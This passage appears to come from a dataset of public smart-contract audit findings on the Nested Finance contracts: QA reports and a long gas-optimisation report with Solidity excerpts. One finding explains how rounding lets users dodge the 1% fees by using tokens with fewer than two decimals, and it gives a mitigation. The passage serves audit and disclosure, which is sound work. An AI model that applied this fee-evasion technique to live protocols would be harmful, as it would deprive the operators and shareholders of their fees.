ETH_SENDER_NOT_WETH\");\n}\n```\n\n1. Check that `_fromReserve` is false in the scenario `address(_inputToken) == ETH`.\n\n```jsx\nif (address(_inputToken) == ETH) {\n  require(!_fromReserve, \"NF: INVALID_INPUT_TOKEN\");\n  require(address(this).balance >= _inputTokenAmount, \"NF: INVALID_AMOUNT_IN\");\n  weth.deposit{ value: _inputTokenAmount }();\n  return (IERC20(address(weth)), _inputTokenAmount);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/44"
    }
  },
  {
    "title": "QA report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-nested/blob/69cf51d8e4eeb8bce3025db7f4f74cc565c9fad3/contracts/NestedFactory.sol#L223\nhttps://github.com/code-423n4/2022-02-nested/blob/69cf51d8e4eeb8bce3025db7f4f74cc565c9fad3/contracts/NestedFactory.sol#L336\nhttps://github.com/code-423n4/2022-02-nested/blob/fe6f9ef7783c3c84798c8ab5fc58085a55cebcfc/contracts/FeeSplitter.sol#L327\n\n\n# Vulnerability details\n\nThe contract assumes that the number of decimals for every input token will be at least two, but this is not the case. For example ERC884 tokens, which are ERC20-compatible, [are required to have zero decimals](https://github.com/ethereum/EIPs/blob/2a137d7c5cac78f21f048801b35fa286101c1a93/EIPS/eip-884.md?plain=1#L94).\n\n## Impact\nBy using a token that has fewer than two decimals, or wrapping a token with many decimals with another token that has fewer than two decimals, users can game the protocol and transact without fees. There are *three separate instances* of this issue: fees for tokens bought, fees for tokens spent, and split fees/royalties\n\n## Proof of Concept\n### 1. Bought tokens\n```solidity\n        uint256 amountFees = amountBought / 100; // 1% Fee\n```\nhttps://github.com/code-423n4/2022-02-nested/blob/69cf51d8e4eeb8bce3025db7f4f74cc565c9fad3/contracts/NestedFactory.sol#L223\n```solidity\n        feesAmount = amountBought / 100; // 1% Fee\n```\nhttps://github.com/code-423n4/2022-02-nested/blob/69cf51d8e4eeb8bce3025db7f4f74cc565c9fad3/contracts/NestedFactory.sol#L396\n\nIf `amountBought`'s token is an ERC884 token and the user submits 99 tokens per transaction, loss of precision during the division leads to zero fees.\n\n### 2. Spent tokens\n```solidity\n        feesAmount = amountSpent / 100; // 1% Fee\n```\nhttps://github.com/code-423n4/2022-02-nested/blob/69cf51d8e4eeb8bce3025db7f4f74cc565c9fad3/contracts/NestedFactory.sol#L336\n\n### 3. Split fees/royalties\n```solidity\n    function _computeShareCount(\n        uint256 _amount,\n        uint256 _weight,\n        uint256 _totalWeights\n    ) private pure returns (uint256) {\n        return (_amount * _weight) / _totalWeights;\n    }\n```\nhttps://github.com/code-423n4/2022-02-nested/blob/fe6f9ef7783c3c84798c8ab5fc58085a55cebcfc/contracts/FeeSplitter.sol#L327\n\n```solidity\n    function _sendFees(\n        IERC20 _token,\n        uint256 _amount,\n        uint256 _totalWeights\n    ) private {\n        Shareholder[] memory shareholdersCache = shareholders;\n        for (uint256 i = 0; i < shareholdersCache.length; i++) {\n            _addShares(\n                shareholdersCache[i].account,\n                _computeShareCount(_amount, shareholdersCache[i].weight, _totalWeights),\n```\nhttps://github.com/code-423n4/2022-02-nested/blob/fe6f9ef7783c3c84798c8ab5fc58085a55cebcfc/contracts/FeeSplitter.sol#L274-L283\n\n```solidity\n    function sendFeesWithRoyalties(\n        address _royaltiesTarget,\n        IERC20 _token,\n        uint256 _amount\n    ) external nonReentrant {\n        require(_royaltiesTarget != address(0), \"FS: INVALID_ROYALTIES_TARGET\");\n\n        uint256 balanceBeforeTransfer = _token.balanceOf(address(this));\n        _token.safeTransferFrom(_msgSender(), address(this), _amount);\n        uint256 amountReceived = _token.balanceOf(address(this)) - balanceBeforeTransfer;\n\n        uint256 royaltiesAmount = _computeShareCount(amountReceived, royaltiesWeight, totalWeights);\n```\nhttps://github.com/code-423n4/2022-02-nested/blob/fe6f9ef7783c3c84798c8ab5fc58085a55cebcfc/contracts/FeeSplitter.sol#L191-L202\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\n`require()` that ERC20 tokens used have two or more decimals for bought/spent tokens. For split fees and royalties, keep track of partial amounts, or document the rounding down of amounts.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/35"
    }
  },
  {
    "title": "QA Report",
    "body": "Overall the code is high-quality and easy to follow. I did find some low-risk and non-critical findings below.\n\n# Low risk findings\n## areOperatorsImported has incorrect logic\nRight now, this function returns false if the implementation AND the selector don't match. It's possible to provide a destination with  either a different implementation or selector, and still get a true response.\n\nhttps://github.com/code-423n4/2022-02-nested/blob/69cf51d8e4eeb8bce3025db7f4f74cc565c9fad3/contracts/OperatorResolver.sol#L42\nMitigation is to change && to ||.\n\n## Accidentally calling withdraw twice with the same parameters could withdraw multiple assets\nIf a user accidentally submits two withdraw transactions from the frontend, they will withdraw the token at that index and the last token in the list originally. Making sure that the user is unable to do this on the frontend will be important.\n\n# Non-critical findings\n\n## Flat operator doesn't need IERC20 imported from openzeppelin\n\n## No nftDestroyed event on destroy call\n\n## No nftUpdated event on updateLockTimestamp function",
    "dataSource": {
      "name": "code-423n4/2022-02-nested-findings",
      "repo": "https://github.com/code-423n4/2022-02-nested-findings",
      "url": "https://github.com/code-423n4/2022-02-nested-findings/issues/33"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n**Table of Contents:**\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [File: NestedRecords.sol](#file-nestedrecordssol)\n    - [function store()](#function-store)\n      - [Cache `records[_nftId].reserve`](#cache-records_nftidreserve)\n      - [Inclusive comparison](#inclusive-comparison)\n    - [function deleteAsset()](#function-deleteasset)\n      - [Unchecked block](#unchecked-block)\n  - [File: NestedFactory.sol](#file-nestedfactorysol)\n    - [function removeOperator()](#function-removeoperator)\n      - [Unchecked block](#unchecked-block-1)\n    - [function destroy()](#function-destroy)\n      - [Unchecked block (1)](#unchecked-block-1)\n      - [Unchecked block (2)](#unchecked-block-2)\n    - [function _submitInOrders()](#function-_submitinorders)\n      - [Unchecked block (1)](#unchecked-block-1-1)\n      - [Unchecked block (2)](#unchecked-block-2-1)\n    - [function _submitOutOrders()](#function-_submitoutorders)\n      - [Unchecked block (1)](#unchecked-block-1-2)\n      - [Unchecked block (2)](#unchecked-block-2-2)\n      - [Unchecked block (3)](#unchecked-block-3)\n      - [Unchecked block (4)](#unchecked-block-4)\n    - [function _safeSubmitOrder()](#function-_safesubmitorder)\n      - [Unchecked block](#unchecked-block-2)\n    - [function _transferToReserveAndStore()](#function-_transfertoreserveandstore)\n      - [Unchecked block](#unchecked-block-3)\n    - [function _transferInputTokens()](#function-_transferinputtokens)\n      - [Unchecked block](#unchecked-block-4)\n    - [function _safeTransferWithFees()](#function-_safetransferwithfees)\n      - [Unchecked block](#unchecked-block-5)\n  - [File: FeeSplitter.sol](#file-feesplittersol)\n    - [function updateShareholder()](#function-updateshareholder)\n      - [Cache `totalWeights`](#cache-totalweights)\n    - [function sendFees()](#function-sendfees)\n      - [Unchecked block](#unchecked-block-6)\n    - [function sendFeesWithRoyalties()](#function-sendfeeswithroyalties)\n      - [Unchecked block](#unchecked-block-7)\n      - [Cache `totalWeights`](#cache-totalweights-1)\n    - [function getAmountDue()](#function-getamountdue)\n      - [Cache `_tokenRecords.totalShares`](#cache-_tokenrecordstotalshares)\n    - [function _addShareholder()](#function-_addshareholder)\n      - [A private function used only once can get inlined](#a-private-function-used-only-once-can-get-inlined)\n  - [File: ZeroExOperator.sol](#file-zeroexoperatorsol)\n    - [function performSwap()](#function-performswap)\n      - [Unchecked block (1)](#unchecked-block-1-3)\n      - [Unchecked block (2)](#unchecked-block-2-3)\n  - [File: INestedFactory.sol](#file-inestedfactorysol)\n    - [Storage](#storage)\n      - [Tightly pack struct `BatchedInputOrders`](#tightly-pack-struct-batchedinputorders)\n      - [Tightly pack struct `BatchedOutputOrders`](#tightly-pack-struct-batchedoutputorders)\n      - [Only use 1 struct](#only-use-1-struct)\n  - [General recommendations](#general-recommendations)\n    - [Variables](#variables)\n      - [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values)\n    - [Comparisons](#comparisons)\n    - [Amounts should be checked for 0 before calling a transfer](#amounts-should-be-checked-for-0-before-calling-a-transfer)\n    - [For-Loops](#for-loops)\n      - [`++i` costs less gas compared to `i++`](#i-costs-less-gas-compared-to-i)\n      - [Increments can be unchecked](#increments-can-be-unchecked)\n      - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n    - [Errors](#errors)\n      - [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings)\n      - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Foreword\n- **Storage-reading optimizations**\n> The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). In the paragraphs below, please see the `@audit-issue` tags in the pieces of code's comments for more information about SLOADs that could be saved by caching the mentioned **storage** variables in **memory** variables.\n\n- **Unchecking arithmetics operations that can't underflow/overflow**\n> Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation, or the operation doesn't depend on user input), some gas can be saved by using an `unchecked` block: https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic\n\n- **`@audit` tags**\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: NestedRecords.sol\n### function store()\n```\n111:     function store(\n...\n118:         if (amount != 0) {\n119:             require(records[_nftId].reserve == _reserve, \"NRC: RESERVE_MISMATCH\"); //@audit records[_nftId].reserve SLOAD 1 \n120:             updateHoldingAmount(_nftId, _token, amount + _amount);\n121:             return;\n122:         }\n123:         require(records[_nftId].tokens.length < maxHoldingsCount, \"NRC: TOO_MANY_TOKENS\"); //@audit should be inclusive\n124:         require(\n125:             _reserve != address(0) && (_reserve == records[_nftId].reserve || records[_nftId].reserve == address(0)), //@audit records[_nftId].reserve SLOAD 1 & 2\n126:             \"NRC: INVALID_RESERVE\"\n127:         );\n...\n```\n#### Cache `records[_nftId].reserve`\nCaching this in memory can save around 1 SLOAD\n\n#### Inclusive comparison\nBy definition, `maxHoldingsCount` is the `The maximum number of holdings for an NFT record`. \nHere, as an example, if `maxHoldingsCount == 1` and `records[_nftId].tokens.length == 1`, the function will revert. \nI believe this check should be inclusive (like this `records[_nftId].tokens.length <= maxHoldingsCount`).\nThis is both a Low-risk issue and a gas issue as `<` costs 3 more gas than `<=` due to the additional `ISZERO` opcode (even with the Optimizer)\n\n### function deleteAsset()\n```\n88:     function deleteAsset(uint256 _nftId, uint256 _tokenIndex) public onlyFactory {\n89:         address[] storage tokens = records[_nftId].tokens;\n90:         address token = tokens[_tokenIndex];\n91: \n92:         require(records[_nftId].holdings[token] != 0, \"NRC: HOLDING_INACTIVE\");\n93: \n94:         delete records[_nftId].holdings[token];\n95:         tokens[_tokenIndex] = tokens[tokens.length - 1]; //@audit gas: can't underflow\n96:         tokens.pop();\n97:     }\n\n```\n#### Unchecked block\n\nIf `tokens.length == 1`, all assets would be deleted.\nIf `tokens.length == 0`, line 90 would've thrown an error and trigger a revert.\nAs it's impossible for line 95 to underflow, it should be wrapped inside an `unchecked` block.\n\n## File: NestedFactory.sol\n### function removeOperator()\n```\n111:     function removeOperator(bytes32 operator) external override onlyOwner {\n112:         uint256 operatorsLength = operators.length;\n113:         for (uint256 i = 0; i < operatorsLength; i++) {\n114:             if (operators[i] == operator) {\n115:                 operators[i] = operators[operatorsLength - 1];  //@audit can't underflow\n...\n```\n#### Unchecked block\nLine 115 can't underflow due to `operatorsLength > 0` (the for-loop wouldn't iterate otherwise). Therefore, line 115 should be wrapped inside an `unchecked` block.\n\n### function destroy()\n```\n200:     function destroy(\n...\n211:         uint256 buyTokenInitialBalance = _buyToken.balanceOf(address(this));\n212: \n213:         for (uint256 i = 0; i < tokensLength; i++) {\n214:             uint256 amount = nestedRecords.getAssetHolding(_nftId, tokens[i]);\n215:             reserve.withdraw(IERC20(tokens[i]), amount);\n216: \n217:             _safeSubmitOrder(tokens[i], address(_buyToken), amount, _nftId, _orders[i]);\n218:             nestedRecords.freeHolding(_nftId, tokens[i]);\n219:         }\n220: \n221:         // Amount calculation to send fees and tokens\n222:         uint256 amountBought = _buyToken.balanceOf(address(this)) - buyTokenInitialBalance;//@audit can't underflow \n223:         uint256 amountFees = amountBought / 100; // 1% Fee\n224:         amountBought -= amountFees; //@audit can't underflow (equivalent to \"amountBought = amountBought - (amountBought / 100)\")\n...\n```\n\n#### Unchecked block (1)\nAs `buyTokenInitialBalance` is  `<=` to the final `_buyToken.balanceOf(address(this))`, line 222 can't underflow. \nTherefore, line 222 should be wrapped inside an `unchecked` block.\n\n#### Unchecked block (2)\nAs `amountBought -= amountFees` is equivalent to `amountBought = amountBought - (amountBought / 100)`, the result can't underflow.\nTherefore, line 223 should be wrapped inside an `unchecked` block.\n\n### function _submitInOrders()\n```\n311:     function _submitInOrders(\n...\n337:         require(amountSpent <= _inputTokenAmount - feesAmount, \"NF: OVERSPENT\");\n338: \n339:         uint256 underSpentAmount = _inputTokenAmount - feesAmount - amountSpent; //@audit can't underflow\n340:         if (underSpentAmount != 0) {\n341:             tokenSold.safeTransfer(_fromReserve ? address(reserve) : _msgSender(), underSpentAmount);\n342:         }\n343: \n344:         // If input is from the reserve, update the records\n345:         if (_fromReserve) {\n346:             _decreaseHoldingAmount(_nftId, address(tokenSold), _inputTokenAmount - underSpentAmount); //@audit can't underflow\n347:         }\n...\n```\n\n#### Unchecked block (1)\nLine 339 can't underflow due to the require statement line 337. \nTherefore, line 339 should be wrapped inside an `unchecked` block.\n\n#### Unchecked block (2)\nAs `underSpentAmount = _inputTokenAmount - feesAmount - amountSpent` (line 339): `_inputTokenAmount >= underSpentAmount`.\nTherefore, line 346 can't underflow and should be wrapped inside an `unchecked` block.\n\n### function _submitOutOrders()\n```\n357:     function _submitOutOrders(\n...\n365:         amountBought = _batchedOrders.outputToken.balanceOf(address(this));\n...\n385:             require(amountSpent <= _inputTokenAmount, \"NF: OVERSPENT\");\n386: \n387:             uint256 underSpentAmount = _inputTokenAmount - amountSpent; //@audit can't underflow\n388:             if (underSpentAmount != 0) {\n389:                 _inputToken.safeTransfer(address(reserve), underSpentAmount);\n390:             }\n391: \n392:             _decreaseHoldingAmount(_nftId, address(_inputToken), _inputTokenAmount - underSpentAmount); //@audit can't underflow\n393:         }\n394: \n395:         amountBought = _batchedOrders.outputToken.balanceOf(address(this)) - amountBought; //@audit can't underflow\n396:         feesAmount = amountBought / 100; // 1% Fee //@audit HIGH free stuff under 100 ? Check on Remix. That's one of Secureum's audit findings\n397: \n398:         if (_toReserve) {\n399:             _transferToReserveAndStore(_batchedOrders.outputToken, amountBought - feesAmount, _nftId);//@audit can't underflow\n400:         }\n401:     }\n```\n\n#### Unchecked block (1)\nLine 387 can't underflow due to the require statement line 385. \nTherefore, line 387 should be wrapped inside an `unchecked` block.\n\n#### Unchecked block (2)\nAs `underSpentAmount = _inputTokenAmount - amountSpent`: `_inputTokenAmount >= underSpentAmount`.\nTherefore, line 392 can't underflow and should be wrapped inside an `unchecked` block.\n\n#### Unchecked block (3)\nAs the initial `_batchedOrders.outputToken.balanceOf(address(this))` line 365 is  `<=` to the final `_batchedOrders.outputToken.balanceOf(address(this))` line 395: line 395 can't underflow. \nTherefore, line 395 should be wrapped inside an `unchecked` block.\n\n#### Unchecked block (4)\nAs `amountBought - feesAmount` is equivalent to `amountBought - (amountBought / 100)`, the result can't underflow.\nTherefore, line 399 should be wrapped inside an `unchecked` block.\n\n### function _safeSubmitOrder()\n```\n435:     function _safeSubmitOrder(\n...\n445:             if (_amountToSpend > amounts[1]) {\n446:                 IERC20(_inputToken).safeTransfer(_msgSender(), _amountToSpend - amounts[1]); //@audit should be unchecked (see L445)\n447:             }\n...\n```\n\n#### Unchecked block\nLine 446 can't underflow due to the require statement line 445. \nTherefore, line 446 should be wrapped inside an `unchecked` block.\n\n### function _transferToReserveAndStore()\n```\n458:     function _transferToReserveAndStore(\n459:         IERC20 _token,\n460:         uint256 _amount,\n461:         uint256 _nftId\n462:     ) private {\n463:         address reserveAddr = address(reserve);\n464:         uint256 balanceReserveBefore = _token.balanceOf(reserveAddr);\n465: \n466:         // Send output to reserve\n467:         _token.safeTransfer(reserveAddr, _amount);\n468: \n469:         uint256 balanceReserveAfter = _token.balanceOf(reserveAddr);\n470: \n471:         nestedRecords.store(_nftId, address(_token), balanceReserveAfter - balanceReserveBefore, reserveAddr);//@audit can't underflow\n472:     }\n```\n\n#### Unchecked block\nAs the initial `_token.balanceOf(reserveAddr)` is  `<=` to the final `_token.balanceOf(reserveAddr)`: line 471 can't underflow. \nTherefore, line 471 should be wrapped inside an `unchecked` block.\n\n### function _transferInputTokens()\n```\n482:     function _transferInputTokens(\n...\n494:         uint256 balanceBefore = _inputToken.balanceOf(address(this));\n495:         if (_fromReserve) {\n496:             require(\n497:                 nestedRecords.getAssetHolding(_nftId, address(_inputToken)) >= _inputTokenAmount,\n498:                 \"NF: INSUFFICIENT_AMOUNT_IN\"\n499:             );\n500:             // Get input from reserve\n501:             reserve.withdraw(IERC20(_inputToken), _inputTokenAmount);\n502:         } else {\n503:             _inputToken.safeTransferFrom(_msgSender(), address(this), _inputTokenAmount);\n504:         }\n505:         return (_inputToken, _inputToken.balanceOf(address(this)) - balanceBefore); //@audit can't underflow\n506:     }\n```\n\n#### Unchecked block\nAs the initial `_inputToken.balanceOf(address(this))` is  `<=` to the final `_inputToken.balanceOf(address(this))`: line 505 can't underflow. \nTherefore, it should be wrapped inside an `unchecked` block.\n\n### function _safeTransferWithFees()\n```\n566:     function _safeTransferWithFees(\n567:         IERC20 _token,\n568:         uint256 _amount,\n569:         address _dest,\n570:         uint256 _nftId\n571:     ) private {\n572:         uint256 feeAmount = _amount / 100; // 1% Fee\n573:         _transferFeeWithRoyalty(feeAmount, _token, _nftId);\n574:         _token.safeTransfer(_dest, _amount - feeAmount);//@audit can't underflow\n575:     }\n```\n\n#### Unchecked block\nAs `_amount - feeAmount` is equivalent to `_amount - (_amount / 100)`, the result can't underflow.\nTherefore, line 574 should be wrapped inside an `unchecked` block.\n\n## File: FeeSplitter.sol\n\n### function updateShareholder()\n```)\n134:     function updateShareholder(uint256 _accountIndex, uint96 _weight) external onlyOwner {\n135:         require(_accountIndex < shareholders.length, \"FS: INVALID_ACCOUNT_INDEX\");\n136:         totalWeights = totalWeights + _weight - shareholders[_accountIndex].weight; //@audit cache\n137:         require(totalWeights != 0, \"FS: TOTAL_WEIGHTS_ZERO\");\n138:         shareholders[_accountIndex].weight = _weight;\n139:         emit ShareholderUpdated(shareholders[_accountIndex].account, _weight);\n140:     }\n```\n#### Cache `totalWeights`\nIt's possible to save around 1 SLOAD by caching `totalWeights` in memory, like this:\n```)\n134:     function updateShareholder(uint256 _accountIndex, uint96 _weight) external onlyOwner {\n135:         require(_accountIndex < shareholders.length, \"FS: INVALID_ACCOUNT_INDEX\");\n136:         uint256 _totalWeights = totalWeights + _weight - shareholders[_accountIndex].weight;  //@audit +MSTORE\n137:         require(_totalWeights != 0, \"FS: TOTAL_WEIGHTS_ZERO\"); //@audit +MLOAD -SLOAD\n138:         totalWeights = _totalWeights; //@audit +MLOAD\n139:         shareholders[_accountIndex].weight = _weight;\n140:         emit ShareholderUpdated(shareholders[_accountIndex].account, _weight);\n141:     }\n```\n\n### function sendFees()\n```\n175:     function sendFees(IERC20 _token, uint256 _amount) external nonReentrant {\n176:         uint256 weights;\n177:         unchecked {\n178:             weights = totalWeights - royaltiesWeight;\n179:         }\n180: \n181:         uint256 balanceBeforeTransfer = _token.balanceOf(address(this));\n182:         _token.safeTransferFrom(_msgSender(), address(this), _amount); \n183: \n184:         _sendFees(_token, _token.balanceOf(address(this)) - balanceBeforeTransfer, weights); //@audit can't underflow (see L181 and L182)\n185:     }\n```\n\n#### Unchecked block\nAs the initial `_token.balanceOf(address(this))` is  `<=` to the final `_token.balanceOf(address(this))`: line 184 can't underflow. \nTherefore, it should be wrapped inside an `unchecked` block.\n\n### function sendFeesWithRoyalties()\n```\n191:     function sendFeesWithRoyalties(\n...\n198:         uint256 balanceBeforeTransfer = _token.balanceOf(address(this));\n199:         _token.safeTransferFrom(_msgSender(), address(this), _amount);\n200:         uint256 amountReceived = _token.balanceOf(address(this)) - balanceBeforeTransfer;  //@audit can't underflow\n201: \n202:         uint256 royaltiesAmount = _computeShareCount(amountReceived, royaltiesWeight, totalWeights); //@audit totalWeights SLOAD 1\n203: \n204:         _sendFees(_token, amountReceived, totalWeights);//@audit totalWeights SLOAD 2\n...\n```\n\n#### Unchecked block\nAs the initial `_token.balanceOf(address(this))` is  `<=` to the final `_token.balanceOf(address(this))`: line 200 can't underflow. \nTherefore, it should be wrapped inside an `unchecked` block.\n\n#### Cache `totalWeights` \nCaching this in memory can save around 1 SLOAD\n\n### function getAmountDue()\n```\n216:     function getAmountDue(address _account, IERC20 _token) public view returns (uint256) {\n217:         TokenRecords storage _tokenRecords = tokenRecords[address(_token)];\n218:         if (_tokenRecords.totalShares == 0) return 0;//@audit _tokenRecords.totalShares SLOAD 1\n219: \n220:         uint256 totalReceived = _tokenRecords.totalReleased + _token.balanceOf(address(this));\n221:         return\n222:             (totalReceived * _tokenRecords.shares[_account]) /\n223:             _tokenRecords.totalShares - //@audit _tokenRecords.totalShares SLOAD 2\n224:             _tokenRecords.released[_account];\n225:     }\n```\n\n#### Cache `_tokenRecords.totalShares` \nCaching this in memory can save around 1 SLOAD\n\n### function _addShareholder()\n#### A private function used only once can get inlined \nAs this private function is only used once line 127 in function setShareholders(), it can get inlined to save some gas.\n\n## File: ZeroExOperator.sol\n### function performSwap()\n```\n21:     function performSwap(\n...\n28:         uint256 buyBalanceBeforePurchase = buyToken.balanceOf(address(this));\n29:         uint256 sellBalanceBeforePurchase = sellToken.balanceOf(address(this));\n30: \n31:         bool success = ExchangeHelpers.fillQuote(sellToken, operatorStorage.swapTarget(), swapCallData);\n32:         require(success, \"ZEO: SWAP_FAILED\");\n33: \n34:         uint256 amountBought = buyToken.balanceOf(address(this)) - buyBalanceBeforePurchase; //@audit can't underflow (see L28 and L31)\n35:         uint256 amountSold = sellBalanceBeforePurchase - sellToken.balanceOf(address(this));//@audit can't underflow (see L29 and L31)\n36:         require(amountBought != 0, \"ZeroExOperator::performSwap: amountBought cant be zero\"); //@audit-info move up 1 ? Will certainly cost more gas on happy path while saving some on sad path. Not a good trade-off\n37:         require(amountSold != 0, \"ZeroExOperator::performSwap: amountSold cant be zero\");\n...\n```\n\n#### Unchecked block (1)\nAs the initial `buyToken.balanceOf(address(this))` is  `<=` to the final `buyToken.balanceOf(address(this))`: line 34 can't underflow. \nTherefore, it should be wrapped inside an `unchecked` block.\n\n#### Unchecked block (2)\nAs the initial `sellToken.balanceOf(address(this))` is  `<=` to the final `sellToken.balanceOf(address(this))`: line 35 can't underflow. \nTherefore, it should be wrapped inside an `unchecked` block.\n\n## File: INestedFactory.sol\n### Storage\n#### Tightly pack struct `BatchedInputOrders`\n\n`struct BatchedInputOrders` can be tightly packed to save 1 storage slot by changing the code from this:\n```\n    struct BatchedInputOrders {\n        IERC20 inputToken;//@audit 20 byte\n        uint256 amount; //@audit 32 byte\n        Order[] orders; //@audit fully takes slots\n        bool fromReserve; //@audit 1 byte\n    }\n```\nto this:\n```\n    struct BatchedInputOrders {\n        IERC20 inputToken;//@audit 20 byte\n        bool fromReserve; //@audit 1 byte\n        uint256 amount; //@audit 32 byte\n        Order[] orders; //@audit fully takes slots\n    }\n```\n\n#### Tightly pack struct `BatchedOutputOrders`\n\n`struct BatchedOutputOrders` can be tightly packed to save 1 storage slot by changing the code from this:\n```\n    struct BatchedOutputOrders {\n        IERC20 outputToken;//@audit 20 byte\n        uint256[] amounts;//@audit 32 byte\n        Order[] orders;//@audit fully takes slots\n        bool toReserve;//@audit 1 byte\n    }\n```\nto this:\n```\n    struct BatchedOutputOrders {\n        IERC20 outputToken;//@audit 20 byte\n        bool toReserve;//@audit 1 byte\n        uint256[] amounts;//@audit 32 byte\n        Order[] orders;//@audit fully takes slots\n    }\n```\n\n#### Only use 1 struct\n\nIn my opinion, the structs here are used in an unintended way: it's not up to a struct to carry the input/output concept here.\n\nIt's possible to use only 1 struct for the whole logic, as such:\n```\n    struct BatchedOrders {\n        IERC20 token;\n        bool hasReserve;\n        uint256[] amounts;\n        Order[] orders;\n    }\n```\nAnd then declare input and output variables with this, like: `BatchedOrders[] _batchedInputOrders` or `BatchedOrders[] _batchedOutputOrders`.\n\nSame struct, different variables.\n\nI suggest going from:\n```\nNestedFactory.sol:\n  141:     function create(uint256 _originalTokenId, BatchedInputOrders[] calldata _batchedOrders)\n  162:     function processInputOrders(uint256 _nftId, BatchedInputOrders[] calldata _batchedOrders)\n  176:     function processOutputOrders(uint256 _nftId, BatchedOutputOrders[] calldata _batchedOrders)\n  190:         BatchedInputOrders[] calldata _batchedInputOrders,\n  191:         BatchedOutputOrders[] calldata _batchedOutputOrders\n  193:         _checkMsgValue(_batchedInputOrders);\n  194:         _processInputOrders(_nftId, _batchedInputOrders);\n  195:         _processOutputOrders(_nftId, _batchedOutputOrders);\n  268:     function _processInputOrders(uint256 _nftId, BatchedInputOrders[] calldata _batchedOrders) private {\n  286:     function _processOutputOrders(uint256 _nftId, BatchedOutputOrders[] calldata _batchedOrders) private {\n  313:         BatchedInputOrders calldata _batchedOrders,\n  359:         BatchedOutputOrders calldata _batchedOrders,\n  579:     function _checkMsgValue(BatchedInputOrders[] calldata _batchedOrders) private {\n\ninterfaces\\INestedFactory.sol:\n  106:     function create(uint256 _originalTokenId, BatchedInputOrders[] calldata _batchedOrders) external payable;\n  111:     function processInputOrders(uint256 _nftId, BatchedInputOrders[] calldata _batchedOrders) external payable;\n  116:     function processOutputOrders(uint256 _nftId, BatchedOutputOrders[] calldata _batchedOrders) external;\n  120:     /// @param _batchedInputOrders The input orders to execute (first)\n  121:     /// @param _batchedOutputOrders The output orders to execute (after)\n  124:         BatchedInputOrders[] calldata _batchedInputOrders,\n  125:         BatchedOutputOrders[] calldata _batchedOutputOrders\n```\nto\n```\nNestedFactory.sol:\n  141:     function create(uint256 _originalTokenId, BatchedOrders[] calldata _batchedInputOrders)\n  162:     function processInputOrders(uint256 _nftId, BatchedOrders[] calldata _batchedInputOrders)\n  176:     function processOutputOrders(uint256 _nftId, BatchedOrders[] calldata _batchedOutputOrders)\n  190:         BatchedOrders[] calldata _batchedInputOrders,\n  191:         BatchedOrders[] calldata _batchedOutputOrders\n  193:         _checkMsgValue(_batchedInputOrders);\n  194:         _processInputOrders(_nftId, _batchedInputOrders);\n  195:         _processOutputOrders(_nftId, _batchedOutputOrders);\n  268:     function _processInputOrders(uint256 _nftId, BatchedOrders[] calldata _batchedInputOrders) private {\n  286:     function _processOutputOrders(uint256 _nftId, BatchedOrders[] calldata _batchedOutputOrders) private {\n  313:         BatchedOrders calldata _batchedInputOrders,\n  359:         BatchedOrders calldata _batchedOutputOrders,\n  579:     function _checkMsgValue(BatchedOrders[] calldata _batchedInputOrders) private {\n\ninterfaces\\INestedFactory.sol:\n  106:     function create(uint256 _originalTokenId, BatchedOrders[] calldata _batchedInputOrders) external payable;\n  111:     function processInputOrders(uint256 _nftId, BatchedOrders[] calldata _batchedInputOrders) external payable;\n  116:     function processOutputOrders(uint256 _nftId, BatchedOrders[] calldata _batchedOutputOrders) external;\n  124:         BatchedOrders[] calldata _batchedInputOrders,\n  125:         BatchedOrders[] calldata _batchedOutputOrders\n```\n\n## General recommendations\n### Variables\n#### No need to explicitly initialize variables with default values \n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas. \n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:  \n```\nabstracts\\MixinOperatorResolver.sol:36:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nabstracts\\MixinOperatorResolver.sol:55:        for (uint256 i = 0; i < requiredOperators.length; i++) {\nFeeSplitter.sol:126:        for (uint256 i = 0; i < accountsLength; i++) {\nFeeSplitter.sol:148:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:165:        for (uint256 i = 0; i < _tokens.length; i++) {\nFeeSplitter.sol:261:        for (uint256 i = 0; i < shareholders.length; i++) {\nFeeSplitter.sol:280:        for (uint256 i = 0; i < shareholdersCache.length; i++) {\nFeeSplitter.sol:318:        for (uint256 i = 0; i < shareholders.length; i++) {\nNestedFactory.sol:103:        for (uint256 i = 0; i < operatorsCache.length; i++) {\nNestedFactory.sol:113:        for (uint256 i = 0; i < operatorsLength; i++) {\nNestedFactory.sol:153:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:213:        for (uint256 i = 0; i < tokensLength; i++) {\nNestedFactory.sol:273:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:291:        for (uint256 i = 0; i < batchedOrdersLength; i++) {\nNestedFactory.sol:327:        for (uint256 i = 0; i < batchLength; i++) {\nNestedFactory.sol:369:        for (uint256 i = 0; i < _batchedOrders.orders.length; i++) {\nNestedFactory.sol:581:        for 